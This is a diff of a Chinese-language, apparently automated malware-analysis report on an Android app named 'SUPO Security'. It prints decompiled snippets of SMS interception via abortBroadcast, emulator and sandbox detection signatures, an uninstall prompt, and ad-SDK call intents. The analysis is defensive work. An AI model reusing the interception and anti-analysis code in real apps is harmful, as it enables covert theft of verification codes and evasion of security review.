@@ -6,7 +6,7 @@
     "应用名": "SUPO Security",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 537.5
+    "分析耗时(秒)": 1011.5
   },
   "行为列表": [
     {
@@ -50,63 +50,167 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    if (extras != null) {\n        Object[] objArr = (Object[]) extras.get(\"pdus\");\n        SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n        for (int i = 0; i < objArr.length; i++) {\n            smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n        }\n        for (SmsMessage smsMessage : smsMessageArr) {\n            smsMessage.getDisplayOriginatingAddress();\n        }\n    }\n}",
-          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.a.format(new Date(smsMessage.getTimestampMillis()));\n                  }\n              }\n          }",
-          "behavior_description": "代码监听系统短信接收广播，在收到短信时立即调用 abortBroadcast() 终止广播向下传递，导致系统默认短信应用无法接收并显示该短信，实现短信拦截和隐藏。同时从 Intent 中提取 PDU 数据解析出短信发件人地址等信息，可能用于窃取验证码或隐藏恶意指令短信。",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信到达广播 android.provider.Telephony.SMS_RECEIVED，收到新短信后首先调用 abortBroadcast() 终止广播传播，使系统默认短信应用无法收到该广播，从而将短信对用户隐藏；随后从 Intent extras 中提取 pdus 数据，通过 SmsMessage.createFromPdu() 解析出短信内容，并调用 getDisplayOriginatingAddress() 获取发件人号码。数据流向：系统短信广播（SMS_RECEIVED 的 Intent extras pdus）→ abortBroadcast() 拦截短信阻止用户查看 + 解析短信发件人与正文内容。这种静默拦截短信行为可被用于窃取验证码、银行/支付通知短信，属于典型的短信拦截恶意行为，与厂商报告中伪装安全工具实施数据窃取的行为相符。",
           "glm_analyzed": true
         }
       ]
     },
     {
-      "行为": "device_reboot",
-      "中文名": "设备重启",
-      "MITRE": "",
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
       "置信度": "suspected",
-      "证据": {
-        "方法引用": [],
-        "权限": [],
-        "字符串": [
-          "android.intent.action.REBOOT"
-        ]
-      },
+      "子行为": [
+        {
+          "子行为": "anti_debug",
+          "中文名": "反调试",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "/proc/self/status"
+            ]
+          }
+        },
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish",
+              "ro.kernel.qemu"
+            ]
+          }
+        }
+      ],
       "恶意代码": [
         {
-          "class_path": "Lsps\\zn;",
-          "method_signature": "if(a != null)",
-          "malicious_behavior": "device_reboot",
+          "class_path": "Lcom\\duapps\\ad\\internal\\policy\\a;",
+          "method_signature": "C0006a(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9, String str10, String str11, String str12, String str13, String str14)",
+          "malicious_behavior": "anti_detection",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "arrayList.add(\"android.intent.action.REBOOT\");",
-          "malicious_code_snippet_context": "          arrayList.add(\"android.intent.action.PACKAGE_REPLACED\");\n          arrayList.add(\"android.intent.action.PACKAGE_RESTARTED\");\n          arrayList.add(\"android.intent.action.PROVIDER_CHANGED\");\n>>>         arrayList.add(\"android.intent.action.REBOOT\");\n          arrayList.add(\"android.intent.action.SCREEN_OFF\");\n          arrayList.add(\"android.intent.action.SCREEN_ON\");\n          arrayList.add(\"android.intent.action.TIMEZONE_CHANGED\");",
-          "behavior_description": "代码将 android.intent.action.REBOOT 等多个系统广播Action添加到列表中，用于动态注册BroadcastReceiver监听设备重启等系统事件。在恶意样本中，监听REBOOT广播通常用于实现开机自启和持久化保活机制，确保恶意服务在设备重启后自动运行。",
+          "malicious_code_snippet": "private static String[] e = {\"15555215554\", \"15555215556\", \"15555215558\", ...};\nprivate static String[] f = {\"000000000000000\", \"e21833235b6eef10\", \"012345678912345\"};\nprivate static String[] g = {\"310260000000000\"};\nprivate static String[] h = {\"/dev/socket/qemud\", \"/dev/qemu_pipe\"};\nprivate static String[] i = {\"/dev/socket/genyd\", \"/dev/socket/baseband_genyd\"};\nprivate static String[] j = {\"goldfish\"};\nprivate static c[] k = {new c(\"init.svc.qemud\", null), new c(\"qemu.hw.mainkeys\", null), new c(\"ro.kernel.qemu\", \"1\"), new c(\"ro.product.device\", \"generic\"), new c(\"ro.product.model\", \"sdk\"), new c(\"ro.serialno\", null)};",
+          "malicious_code_snippet_context": "      /* JADX INFO: compiled from: NetworkRequestFilterManager.java */\n      static class b {\n          private static b b;\n>>>         private static String[] e = {\"15555215554\", \"15555215556\", \"15555215558\", \"15555215560\", \"15555215562\", \"15555215564\", \"15555215566\", \"15555215568\", \"15555215570\", \"15555215572\", \"15555215574\", \"15555215576\", \"15555215578\", \"15555215580\", \"15555215582\", \"15555215584\"};\n>>>         private static String[] f = {\"000000000000000\", \"e21833235b6eef10\", \"012345678912345\"};\n>>>         private static String[] g = {\"310260000000000\"};\n>>>         private static String[] h = {\"/dev/socket/qemud\", \"/dev/qemu_pipe\"};\n>>>         private static String[] i = {\"/dev/socket/genyd\", \"/dev/socket/baseband_genyd\"};\n>>>         private static String[] j = {\"goldfish\"};\n>>>         private static c[] k = {new c(\"init.svc.qemud\", null), new c(\"init.svc.qemu-props\", null), new c(\"qemu.hw.mainkeys\", null), new c(\"qemu.sf.fake_camera\", null), new c(\"qemu.sf.lcd_density\", null), new c(\"ro.bootloader\", EnvironmentCompat.MEDIA_UNKNOWN), new c(\"ro.bootmode\", EnvironmentCompat.MEDIA_UNKNOWN), new c(\"ro.hardware\", \"goldfish\"), new c(\"ro.kernel.android.qemud\", null), new c(\"ro.kernel.qemu.gles\", null), new c(\"ro.kernel.qemu\", \"1\"), new c(\"ro.product.device\", \"generic\"), new c(\"ro.product.model\", \"sdk\"), new c(\"ro.product.name\", \"sdk\"), new c(\"ro.serialno\", null)};\n          private static int l = 5;\n          private Context a;\n          private int c;",
+          "behavior_description": "该代码是DuApps广告SDK内置的模拟器环境检测模块，维护了多组模拟器特征签名库：Android模拟器默认手机号(15555215554系列)、默认IMEI(000000000000000等)与默认IMSI(310260000000000)、QEMU模拟器特有文件路径(/dev/socket/qemud、/dev/qemu_pipe)、Genymotion模拟器套接字(/dev/socket/genyd)、goldfish模拟器底层设备名，以及init.svc.qemud、qemu.hw.mainkeys、ro.kernel.qemu=1、ro.product.model=sdk、ro.serialno等模拟器典型系统属性。数据流向：读取设备标识(IMEI/IMSI/手机号)与系统属性/文件路径→与上述模拟器特征签名库逐一比对→判定当前是否运行在模拟器或沙箱分析环境中，进而据此改变应用行为（如在模拟器中隐藏恶意功能以规避安全厂商的自动化沙箱分析，或在广告欺诈场景中过滤模拟器流量）。该反模拟器检测属于反分析对抗手段，本身不直接窃取数据或造成用户损失，但在已确认恶意的样本中起到规避动态检测、帮助恶意行为潜伏的作用。",
           "glm_analyzed": true
         }
       ]
     },
     {
-      "行为": "crypto_wallet_detection",
-      "中文名": "加密钱包地址采集",
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
       "MITRE": "",
-      "置信度": "suspected",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.INSTALL_PACKAGES"
+            ],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.DELETE_PACKAGES"
+            ],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\yellow\\security\\activity\\NewInstallPopViewActivity;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopViewActivity.this.a.getPackageName()));\nintent.addFlags(268435456);\nNewInstallPopViewActivity.this.startActivity(intent);",
+          "malicious_code_snippet_context": "              @Override // android.view.View.OnClickListener\n              public void onClick(View view) {\n                  NewInstallPopViewActivity.this.finish();\n>>>                 Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopViewActivity.this.a.getPackageName()));\n>>>                 intent.addFlags(268435456);\n>>>                 NewInstallPopViewActivity.this.startActivity(intent);\n              }\n          });\n      }",
+          "behavior_description": "该代码位于监听新应用安装事件后弹出的 NewInstallPopViewActivity 中，用户点击按钮后先 finish() 关闭弹窗，随后构造 ACTION_DELETE（android.intent.action.DELETE）意图，目标包名取自字段 a 所持有应用（被监控的新安装应用）的 getPackageName()，添加 FLAG_ACTIVITY_NEW_TASK(268435456) 后调用 startActivity() 调起系统卸载流程。数据流向：getPackageName() 获取目标应用包名(source) → ACTION_DELETE Intent + startActivity() 触发卸载(sink)。需注意：该方式会弹出系统卸载确认框、需用户二次点击确认，并非真正意义上的静默卸载（未使用 pm uninstall 或带 DELETE 权限的静默API）；但在该伪装成安全工具（Security Defender/Security Keeper 家族）的恶意样本中，通过新装应用弹窗诱导用户卸载其他应用（如竞品安全软件）属于欺骗性的不受欢迎行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
       "证据": {
         "方法引用": [],
-        "权限": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
         "字符串": [
-          "iVBORw0KGgoAAAANSUhEUgAAAHUAAAAjCAYAAACq00VWAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2hpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo2NTlBNDE0ODBBMjA2ODExODA4M0E0ODdERThGMTBDNCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo3MDRBMTNGRTkxMjQxMUUzODZEM0FGOEMyMzQ5MDcxOSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo3MDRBMTNGRDkxMjQxMUUzODZEM0FGOEMyMzQ5MDcxOSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RkM3RjExNzQwNzIwNjgxMTgyMkFENjgzNEE1MTM3ODMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NjU5QTQxNDgwQTIwNjgxMTgwODNBNDg3REU4RjEwQzQiLz4gPC9yZGY6RGVzY3Jp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\n",
-          "3942ABA1A44AEE42915E2EF7E18EE112",
-          "3BB9D14C492685349D61A822D2A99588"
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
         ]
       },
       "恶意代码": [
         {
-          "class_path": "Lsps\\bqu;",
-          "method_signature": "?(?)",
-          "malicious_behavior": "crypto_wallet_detection",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "private static final brp aw = new brp(\"3942ABA1A44AEE42915E2EF7E18EE112\", (byte) 11, 101);\n        private String aH = m.a();\n        private String aI = o.a();\n        private String aJ = q.a();\n        private String aK = s.a();\n        private String aL = u.a();\n        private String aM = w.a();\n        private String aN = y.a();\n        private String aO = A.a();\n        private String aP = C.a();",
-          "malicious_code_snippet_context": "      private static final brp at = new brp(\"2CDE5EAE2212E48D91430DDC09F65B7D\", (byte) 11, 100);\n      private static final brp au = new brp(\"B34FA06E5DDAABBAE58B522F0919D391\", (byte) 11, 100);\n      private static final brp av = new brp(\"74C0C4CE295A52FF995976D6ADC257D6DD7022ECC2AB2AF0779E700762DC149B\", (byte) 11, 101);\n>>>     private static final brp aw = new brp(\"3942ABA1A44AEE42915E2EF7E18EE112\", (byte) 11, 101);\n>>>     private boolean[] bn = new boolean[1];\n>>>     private String aH = m.a();\n>>>     private String aI = o.a();\n>>>     private String aJ = q.a();\n>>>     private String aK = s.a();\n>>>     private String aL = u.a();\n>>>     private String aM = w.a();\n>>>     private String aN = y.a();\n>>>     private String aO = A.a();\n      private String aP = C.a();\n      private String aQ = E.a();\n      private String aR = G.a();",
-          "behavior_description": "代码初始化了一系列加密的配置常量（brp对象，包含十六进制字符串），这些常量极有可能是用于匹配加密钱包地址的正则表达式或特征码。同时通过调用多个混淆类的静态方法（如m.a(), o.a()等）获取并存储了一系列字符串变量，可能包含设备信息或配置数据。这些初始化的规则和数据为后续扫描、识别并窃取用户剪贴板、短信或文件中的加密钱包地址做准备，属于典型的加密货币钱包窃取行为前置步骤。",
+          "class_path": "Lsps\\adb;",
+          "method_signature": "z(Context context)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "public static List<String> z(Context context) {\n    return a(context, new Intent(\"android.media.action.IMAGE_CAPTURE\"));\n}\n\nprivate static List<String> a(Context context, Intent intent) {\n    List<ResolveInfo> listQueryIntentActivities = context.getPackageManager().queryIntentActivities(intent, 0);\n}",
+          "malicious_code_snippet_context": "          return a(context, new Intent(\"android.intent.action.SENDTO\", Uri.parse(\"smsto:13410177756\")));\n      }\n  \n>>>     public static List<String> z(Context context) {\n>>>         return a(context, new Intent(\"android.media.action.IMAGE_CAPTURE\"));\n>>>     }\n>>> \n>>>     private static List<String> a(Context context, Intent intent) {\n>>>         ArrayList arrayList = new ArrayList();\n>>>         try {\n              List<ResolveInfo> listQueryIntentActivities = context.getPackageManager().queryIntentActivities(intent, 0);\n              if (listQueryIntentActivities == null || listQueryIntentActivities.size() <= 0) {\n                  return arrayList;",
+          "behavior_description": "该方法构造 android.media.action.IMAGE_CAPTURE Intent，并通过 PackageManager.queryIntentActivities() 查询设备上所有能够处理拍照请求的应用组件。数据流向：构造 IMAGE_CAPTURE Intent（source）→ queryIntentActivities() 枚举设备摄像头相关能力（sink），将可拍照的 Activity 列表返回给调用方。注意：该代码并未真正调用摄像头拍照（无 Camera.open/CameraManager 或 startActivityForResult 实际触发），仅是设备能力探测/指纹枚举。同类中还伴随对 ACTION_CALL、ACTION_SENDTO 的能力探测，属于恶意样本中典型的设备能力侦察模块，为后续可能的摄像头滥用或环境探测做前置准备，属间接风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL",
+              "android.intent.action.DIAL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\facebook\\ads\\internal\\a\\c;",
+          "method_signature": "if(!TextUtils.isEmpty(strC)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String strC = jVar.c();\nif (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n    return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n}",
+          "malicious_code_snippet_context": "  \n      private Intent b(j jVar) {\n          if (!TextUtils.isEmpty(jVar.a()) && g.a(this.b, jVar.a())) {\n>>>             String strC = jVar.c();\n>>>             if (!TextUtils.isEmpty(strC) && (strC.startsWith(\"tel:\") || strC.startsWith(\"telprompt:\"))) {\n>>>                 return new Intent(\"android.intent.action.CALL\", Uri.parse(strC));\n>>>             }\n              PackageManager packageManager = this.b.getPackageManager();\n              if (TextUtils.isEmpty(jVar.b()) && TextUtils.isEmpty(strC)) {\n                  return packageManager.getLaunchIntentForPackage(jVar.a());",
+          "behavior_description": "该代码位于Facebook广告SDK（com.facebook.ads.internal）的广告点击处理逻辑中。当广告服务器下发的广告配置中的目标URI（jVar.c()）以 tel: 或 telprompt: 开头时，代码构造 ACTION_CALL Intent 直接发起电话呼叫。注意此处使用的是 ACTION_CALL 而非 ACTION_DIAL，即不经过拨号界面确认、直接拨出电话（需CALL_PHONE权限）。数据流向为：广告服务器下发的广告响应数据（URI）→ ACTION_CALL Intent 直接呼叫。在已确认的恶意广告类样本中，用户被广告轰炸时误点广告即可能直接拨打电话（如高费率号码），造成话费损失；但该行为本身属于广告SDK标准的点击拨打电话（click-to-call）功能，需用户点击广告触发，非完全静默操作。",
           "glm_analyzed": true
         }
       ]
@@ -119,7 +223,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
